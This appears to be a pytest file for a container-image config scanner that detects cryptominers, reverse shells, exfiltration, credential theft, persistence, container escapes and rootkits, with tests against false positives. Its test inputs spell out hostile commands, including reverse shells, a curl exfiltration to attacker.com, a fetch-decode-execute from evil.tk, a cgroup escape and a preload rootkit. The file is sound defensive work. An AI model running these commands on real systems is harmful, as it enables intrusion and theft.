"""Tests for the config-scan signature library."""

from __future__ import annotations

from knorr.scanning.config_scan import (
    ConfigSignal,
    scan_config,
    scan_texts,
    score_signals,
    strings_from_config,
)


def _cfg(entrypoint=None, cmd=None, env=None, labels=None, history=None):
    """Build a minimal image-config dict for scan_config()."""
    inner = {}
    if entrypoint:
        inner["Entrypoint"] = entrypoint
    if cmd:
        inner["Cmd"] = cmd
    if env:
        inner["Env"] = env
    if labels:
        inner["Labels"] = labels
    out = {"config": inner}
    if history:
        out["history"] = [{"created_by": h} for h in history]
    return out


# ---------------------------------------------------------------------------
# Cryptomining
# ---------------------------------------------------------------------------

def test_miner_binary_in_entrypoint():
    sigs = scan_config(_cfg(entrypoint=["/usr/bin/xmrig", "--config=/etc/config.json"]))
    rules = {s.rule for s in sigs}
    assert "miner-binary" in rules


def test_miner_binary_in_cmd():
    sigs = scan_config(_cfg(cmd=["ccminer", "-a", "cryptonight"]))
    assert any(s.rule == "miner-binary" for s in sigs)


def test_miner_wallet_flag():
    sigs = scan_config(_cfg(entrypoint=[
        "xmrig", "--user=48edfhQ3xa1nBCqMrPnLT6j2Z99s2V8dq5Fak9AyS3ZVXDE3mxKzMhNZ",
    ]))
    rules = {s.rule for s in sigs}
    assert "miner-wallet-flag" in rules or "miner-binary" in rules


def test_monero_wallet_in_env():
    # 95-char Monero mainnet address (valid XMR base58 alphabet)
    wallet = "43ZR6AzgXtE2B9HzNAFqTQE7ZdBCsTVWyTtQdHoPhQ6N3SPfJVzTkLrYgXaiqsS8jZ1jEkN3BCRVeJNqV6D3H5DmBb5HAxy"
    sigs = scan_config(_cfg(env=[f"XMR_WALLET={wallet}"]))
    assert any(s.rule == "monero-wallet" for s in sigs)


def test_mining_pool_url():
    sigs = scan_config(_cfg(env=["POOL=stratum+tcp://pool.supportxmr.com:3333"]))
    assert any(s.rule == "mining-pool" for s in sigs)


def test_kill_competitors():
    sigs = scan_config(_cfg(history=["pkill -9 xmrig"]))
    assert any(s.rule == "kill-competitors" for s in sigs)


# ---------------------------------------------------------------------------
# Reverse shell / C2
# ---------------------------------------------------------------------------

def test_bash_tcp_revshell():
    sigs = scan_config(_cfg(entrypoint=[
        "/bin/bash", "-i", ">&", "/dev/tcp/192.168.1.1/4444", "0>&1"
    ]))
    assert any(s.rule == "bash-tcp" for s in sigs)


def test_nc_exec_revshell():
    sigs = scan_config(_cfg(entrypoint=["nc", "-e", "/bin/sh", "10.0.0.1", "4444"]))
    assert any(s.rule == "nc-exec" for s in sigs)


def test_mkfifo_revshell():
    sigs = scan_config(_cfg(history=["mkfifo /tmp/f; cat /tmp/f | /bin/sh"]))
    assert any(s.rule == "mkfifo-shell" for s in sigs)


def test_python_revshell():
    sigs = scan_config(_cfg(history=[
        "python3 -c \"import socket,subprocess,os;s=socket.socket();"
        "s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0);"
        "subprocess.call(['/bin/sh'])\"",
    ]))
    assert any(s.rule == "python-revshell" for s in sigs)


def test_c2_framework_cobalt_strike():
    sigs = scan_config(_cfg(entrypoint=["cobaltstrike", "-start"]))
    assert any(s.rule == "c2-framework" for s in sigs)


def test_c2_framework_meterpreter_still_confirms():
    sigs = scan_config(_cfg(entrypoint=["meterpreter"]))
    assert any(s.rule == "c2-framework" for s in sigs)


def test_metasploit_install_is_dual_use_not_c2_framework():
    """A bare "apt-get install metasploit-framework" build line must NOT be
    c2-framework: Metasploit is the world's most mainstream, legal pentesting
    framework, ships by default in Kali Linux, and is exactly as consistent
    with a security researcher's own toolbox image as with malice (the
    d0whc3r/kali-ssh false positive, submitted to OSM before this was caught:
    its "C2 host" evidence was gitlab.com/www.kali.org)."""
    sigs = scan_config(_cfg(history=[
        "RUN /bin/sh -c apt-get install -yq metasploit-framework sqlmap",
    ]))
    assert not any(s.rule == "c2-framework" for s in sigs)
    assert any(s.rule == "pentest-toolkit" for s in sigs)


def test_msfvenom_is_pentest_toolkit_not_c2_framework():
    sigs = scan_config(_cfg(cmd=["msfvenom", "-p", "linux/x64/shell_reverse_tcp"]))
    assert any(s.rule == "pentest-toolkit" for s in sigs)
    assert not any(s.rule == "c2-framework" for s in sigs)


# ---------------------------------------------------------------------------
# Malware / botnet families
# ---------------------------------------------------------------------------

def test_linux_cryptobot_known_family():
    sigs = scan_config(_cfg(entrypoint=["kinsing"]))
    assert any(s.rule == "linux-cryptobot" for s in sigs)


def test_linux_cryptobot_deromoner_family_matches():
    sigs = scan_config(_cfg(entrypoint=["/bin/deromoner", "--start"]))
    assert any(s.rule == "linux-cryptobot" for s in sigs)


def test_linux_cryptobot_8220_gang_matches():
    sigs = scan_config(_cfg(history=["known 8220 gang dropper payload"]))
    assert any(s.rule == "linux-cryptobot" for s in sigs)
    sigs2 = scan_config(_cfg(history=["known 8220gang dropper payload"]))
    assert any(s.rule == "linux-cryptobot" for s in sigs2)


def test_linux_cryptobot_bare_8220_does_not_match():
    """8220 is also the Unicode codepoint for a curly quote (U+2018-201D), so
    it appears in essentially every JS character-encoding table as ordinary
    data; a bare "8220" must not confirm linux-cryptobot (the
    refactr/runner-pool false positive, matching a bundled Unicode
    codepoint-map table: '"147":8220,"148":8221')."""
    sigs = scan_config(_cfg(history=[
        'exports.decodeMap={"146":8217,"147":8220,"148":8221,"149":8226}',
    ]))
    assert not any(s.rule == "linux-cryptobot" for s in sigs)


def test_linux_cryptobot_bare_dero_does_not_match():
    """Dero is a real, popular privacy coin that legitimate miners (xmrig,
    etc.) genuinely support and reference in their own source; a bare "dero"
    must not confirm linux-cryptobot (the pmietlicki/xmrig-nvidia false
    positive, matching xmrig's own AstroBWT/Dero mining-algorithm code)."""
    sigs = scan_config(_cfg(history=[
        "COPY src/AstroBWT/dero/xmrig-cu_generated_AstroBWT.cu.o /build/",
    ]))
    assert not any(s.rule == "linux-cryptobot" for s in sigs)


# ---------------------------------------------------------------------------
# Exfiltration
# ---------------------------------------------------------------------------

def test_discord_webhook():
    sigs = scan_config(_cfg(env=[
        "HOOK=https://discord.com/api/webhooks/123456789/abc-token-xyz"
    ]))
    assert any(s.rule == "discord-webhook" for s in sigs)


def test_telegram_bot():
    sigs = scan_config(_cfg(env=["TG=https://api.telegram.org/bot123456:TOKEN/sendMessage"]))
    assert any(s.rule == "telegram-bot" for s in sigs)


def test_curl_post_with_env_dump():
    sigs = scan_config(_cfg(history=[
        'curl -d "$(whoami)@$(hostname)" https://attacker.com/collect'
    ]))
    assert any(s.rule == "curl-post-data" for s in sigs)


# ---------------------------------------------------------------------------
# Credential / cloud access
# ---------------------------------------------------------------------------

def test_cloud_metadata():
    sigs = scan_config(_cfg(history=["curl http://169.254.169.254/latest/meta-data/iam"]))
    assert any(s.rule == "cloud-metadata" for s in sigs)


def test_aws_access_key_id():
    sigs = scan_config(_cfg(env=["AWS_KEY=AKIAIOSFODNN7EXAMPLE"]))
    assert any(s.rule == "aws-creds" for s in sigs)


def test_ssh_private_key():
    sigs = scan_config(_cfg(history=["echo '-----BEGIN RSA PRIVATE KEY-----' > /root/.ssh/id_rsa"]))
    assert any(s.rule == "ssh-keys" for s in sigs)


def test_shadow_read():
    sigs = scan_config(_cfg(history=["cat /etc/shadow"]))
    assert any(s.rule == "shadow-read" for s in sigs)


# ---------------------------------------------------------------------------
# Obfuscation
# ---------------------------------------------------------------------------

def test_fetch_decode_exec():
    sigs = scan_config(_cfg(history=[
        "curl http://evil.tk/stage2.sh | base64 -d | bash"
    ]))
    assert any(s.rule == "fetch-decode-exec" for s in sigs)


def test_base64_decode_exec():
    sigs = scan_config(_cfg(history=["base64 -d /tmp/payload | bash"]))
    assert any(s.rule == "base64-decode-exec" for s in sigs)


def test_python_exec_decode():
    sigs = scan_config(_cfg(entrypoint=[
        "python3", "-c", "exec(base64.b64decode('cHJpbnQoJ2hlbGxvJyk='))"
    ]))
    assert any(s.rule == "python-exec-decode" for s in sigs)


# ---------------------------------------------------------------------------
# Persistence
# ---------------------------------------------------------------------------

def test_cron_inject():
    sigs = scan_config(_cfg(history=["echo '* * * * * /tmp/miner' >> /etc/crontab"]))
    assert any(s.rule == "cron-inject" for s in sigs)


def test_ssh_authkeys():
    sigs = scan_config(_cfg(history=["echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys"]))
    assert any(s.rule == "ssh-authkeys" for s in sigs)


# ---------------------------------------------------------------------------
# Container escape
# ---------------------------------------------------------------------------

def test_cgroup_release_agent():
    sigs = scan_config(_cfg(history=[
        "mkdir /tmp/cgroup && mount -t cgroup -o memory cgroup /tmp/cgroup && "
        "echo /tmp/evil > /tmp/cgroup/release_agent"
    ]))
    assert any(s.rule == "cgroup-release-agent" for s in sigs)


def test_docker_socket():
    sigs = scan_config(_cfg(env=["DOCKER_HOST=unix:///var/run/docker.sock"]))
    assert any(s.rule == "docker-socket" for s in sigs)


# ---------------------------------------------------------------------------
# Rootkit
# ---------------------------------------------------------------------------

def test_preload_rootkit():
    sigs = scan_config(_cfg(history=[
        "echo /usr/local/lib/libprocesshider.so > /etc/ld.so.preload"
    ]))
    assert any(s.rule == "preload-rootkit" for s in sigs)


# ---------------------------------------------------------------------------
# score_signals
# ---------------------------------------------------------------------------

def test_score_signals_empty():
    assert score_signals([]) == 0


def test_score_signals_accumulates():
    sigs = [
        ConfigSignal("cryptomining", "miner-binary", "xmrig"),  # weight 5
        ConfigSignal("cryptomining", "mining-pool", "stratum+tcp://..."),  # weight 4
    ]
    assert score_signals(sigs) >= 9


def test_score_signals_deduplicates_rule():
    # Same rule fired twice (from two config fields) counts only once.
    sigs = [
        ConfigSignal("cryptomining", "miner-binary", "xmrig (entrypoint)"),
        ConfigSignal("cryptomining", "miner-binary", "xmrig (cmd)"),
    ]
    score_once = score_signals([sigs[0]])
    score_twice = score_signals(sigs)
    assert score_twice == score_once


# ---------------------------------------------------------------------------
# strings_from_config
# ---------------------------------------------------------------------------

def test_strings_from_config_collects_all():
    cfg = _cfg(
        entrypoint=["/bin/sh", "-c"],
        cmd=["xmrig"],
        env=["FOO=bar"],
        labels={"maintainer": "test"},
        history=["RUN apt-get install -y curl"],
    )
    texts = strings_from_config(cfg)
    flat = " ".join(texts)
    assert "xmrig" in flat
    assert "FOO=bar" in flat
    assert "apt-get" in flat


def test_strings_from_config_empty():
    assert strings_from_config({}) == []


# ---------------------------------------------------------------------------
# Negative (clean image, no false positives)
# ---------------------------------------------------------------------------

def test_clean_nginx_no_signals():
    sigs = scan_config(_cfg(
        entrypoint=["nginx", "-g", "daemon off;"],
        cmd=None,
        env=["NGINX_VERSION=1.25.3"],
    ))
    assert sigs == []


def test_clean_alpine_healthcheck_no_revshell():
    """exec 3<>/dev/tcp/127.0.0.1/8080 is a wait-for-port health probe, not a revshell."""
    sigs = scan_config(_cfg(history=["exec 3<>/dev/tcp/127.0.0.1/8080; echo 'OK'"]))
    revshell = [s for s in sigs if s.category == "reverse_shell"]
    assert revshell == []


def test_aws_tooling_image_empty_secret_not_flagged():
    """An AWS tooling image that declares AWS_SECRET_ACCESS_KEY= (empty) should not flag."""
    sigs = scan_config(_cfg(env=["AWS_SECRET_ACCESS_KEY=", "AWS_ACCESS_KEY_ID="]))
    cred = [s for s in sigs if s.rule == "aws-creds"]
    assert cred == []


def test_scan_texts_directly():
    texts = ["xmrig --pool=stratum+tcp://pool.supportxmr.com:3333"]
    sigs = scan_texts(texts)
    rules = {s.rule for s in sigs}
    assert "miner-binary" in rules
    assert "mining-pool" in rules
